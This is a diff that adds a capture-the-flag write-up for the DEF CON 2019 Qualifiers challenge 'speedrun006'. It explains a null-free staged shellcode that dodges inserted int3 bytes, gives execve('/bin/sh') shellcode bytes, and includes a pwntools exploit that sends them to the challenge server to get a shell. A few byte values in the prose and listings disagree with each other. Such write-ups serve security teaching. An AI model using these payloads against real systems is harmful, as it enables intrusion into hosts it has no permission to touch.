@@ -1,0 +1,114 @@
+<!--Solve date: 08/19/2021-->
+
+<h1>DEFCON 2019 Qualifiers - speedrun006</h1>
+
+<h2>Binary Exploitation - 5 pts (speedrun)</h2>
+
+<h3>Writeup by YR81</h3>
+
+<p class = "tldr">Summary. Write shellcode that passes checks that reads in unrestricted <code>execve()</code> shellcode.</p>
+
+<h4>Discussion</h4>
+
+<p>This challenge features shellcode that must be 26 bytes long and cannot contain any null bytes.</p>
+
+<img class = "small" src = "./images/defconq_spdrun6_1.png"/>
+
+<p>After a proper shellcode is read in, it is copied in parts to another buffer, but inserting <code>0xcc</code> bytes at indices 5, 10, 20, and 29 (the total shellcode length is extended to 30). In the x86 architecture, <code>0xcc</code> represents <code>int 3</code>, which is a software trap to the debugger. However, when a program executes <code>int 3</code> outside of a debugging context, the program will fault. We need to pad our payload in a way that <code>0xcc</code> is not interpreted as an opcode but rather as a MOD/RM byte or even immediate. Several options exist. One that requires only one additional byte (before the <code>0xcc</code>) is <code>fmul st(4)</code>, which assembles to <code>d8 cc</code>. In addition to the short length, the instruction also does not destroy any user registers, which can be useful in some cases.</p>
+
+<p>It is very hard to spawn a shell with the conditions specified in the initial payload. Thus, we design the first shellcode such that it reads in more code, this time without length or character restrictions. To this end, we need to move the address where we want to write the code to into <code>rsi</code>, which holds the buffer argument to <code>read()</code>. If we do something like <code>lea rsi, qword ptr [rip + X]</code>, where <code>X</code> is the (positive) offset of the instruction immediately following the final inserted <code>0xcc</code> byte relative to the instruction following the <code>lea</code> instruction, then there will be null bytes in our payload, which is not allowed. A trick to bypass this is to simply do <code>lea rsi, qword ptr [rip - 1]</code>, which assembles to <code>48 8d 35 ff ff ff ff</code>. To adjust <code>rsi</code> to the right value, we can simply add a small offset afterwards: <code>add rsi, X+1</code>, where the <code>+1</code> corrects for the <code>-1</code> used in the <code>lea</code> instruction. This assembles to <code>48 88 c6 X+1</code>.</p>
+
+<p>The second-stage shellcode can just mmap a page of memory to load the string <code>/bin/sh</code>, then <code>syscall</code> to <code>execve()</code> as in typical shellcodes.</p>
+
+<h4>Shellcodes</h4>
+
+<p>The first shellcode (including the <code>0xcc</code> insertions in bold) is the following:</p>
+
+<pre class = "asm">
+nop
+nop
+nop
+nop
+fmul st(4)
+nop
+nop
+nop
+fmul st(4)
+lea rsi, [rip - 1]
+nop
+fmul st(4)
+add rsi, 0xc
+syscall
+nop
+fmul st(4)
+</pre>
+
+<p><code>\x90\x90\x90\x90\xd8<b>\xcc</b>\x90\x90\x90\xd8<b>\xcc</b>\x48\x8d\x35\xff\xff\xff\xff\x90\xd8<b>\xcc</b>\x48\x83\xc6\x0d\x0f\x05\x90\xd8<b>\xcc</b></code></p>
+
+<p>Notice how many unused bytes there were in the payload; this is because all the registers are initialized to <code>0</code> and all we really have to do is set <code>rdx</code> to the length of the second payload and <code>rsi</code> to the address of the byte following the initial shellcode (discussed previously) to execute the <code>read()</code> syscall.</p>
+
+<p>The second, shell-spawning shellcode is the following:</p>
+
+<pre class = "asm">
+xor edi, edi
+mov esi, 0x1000
+mov edx, 7
+mov r10, 0x22
+xor r8, r8
+dec r8
+xor r9, r9
+mov eax, 9
+syscall
+mov rdi, rax
+mov rax, 0x68732f6e69622f
+mov qword ptr [rdi], rax
+xor esi, esi
+xor edx, edx
+mov eax, 0x3b
+syscall
+</pre>
+
+<p><code>\x31\xff\xbe\x00\x10\x00\x00\xba\x07\x00\x00\x00\x49\xc7\xc2\x22\x00\x00\x00\x4d\x31\xc0\x49\xff\xc8\x4d\x31\xc9\xb8\x09\x00\x00\x00\x0f\x05\x48\x89\xc7\x48\xb8\x2f\x62\x69\x6e\x2f\x73\x68\x00\x48\x89\x07\x31\xf6\x31\xd2\xb8\x3b\x00\x00\x00\x0f\x05</code></p>
+
+<p>It is a very typical shell spawner that starts by mapping an area of memory to put the <code>/bin/sh</code> string, then proceeds to call <code>execve()</code>.</p>
+
+<h4>Payload</h4>
+
+<pre class = "python">
+from pwn import *
+
+ready = True
+debug = True
+if ready:
+    target, port = "34.211.197.215", 31337
+    p = remote(target, port)
+    libc = ELF("/lib/x86_64-linux-gnu/libc-2.27.so")
+else:
+    procname = "./speedrun6"
+    p = process(procname)
+    libc = ELF("/lib/x86_64-linux-gnu/libc-2.27.so")
+    if debug:
+        context.terminal = ["/mnt/c/Users/********/wsl-terminal/open-wsl.exe", "-e"]
+        gdb.attach(p, gdbscript = """
+        
+        """)
+
+
+
+# exploit goes here
+# lambdas and funcdefs
+sc = b"\x48\x83\xc2\x3e" + b'\xd8' + 3 * b'\x90' + b'\xd8' + b"\x48\x8d\x35\xff\xff\xff\xff\x90" + b'\xd8' + b"\x48\x83\xc6\x0d\x90\x0f\x05\xd8"
+sc2 = b"\x31\xff\xbe\x00\x10\x00\x00\xba\x07\x00\x00\x00\x49\xc7\xc2\x22\x00\x00\x00\x4d\x31\xc0\x49\xff\xc8\x4d\x31\xc9\xb8\x09\x00\x00\x00\x0f\x05\x48\x89\xc7\x48\xb8\x2f\x62\x69\x6e\x2f\x73\x68\x00\x48\x89\x07\x31\xf6\x31\xd2\xb8\x3b\x00\x00\x00\x0f\x05"
+
+# payloads
+p.recvline()
+p.recvline()
+p.send(sc)
+p.send(sc2)
+
+p.interactive()
+</pre>
+
+<h4>Flag</h4>
+
+<p><code>OOO{Uh, guys I__Think We Need A Change of___plans. They got A pwn!!! I'm sorry. Did somebody say a pwn!?!?!?}</code></p>
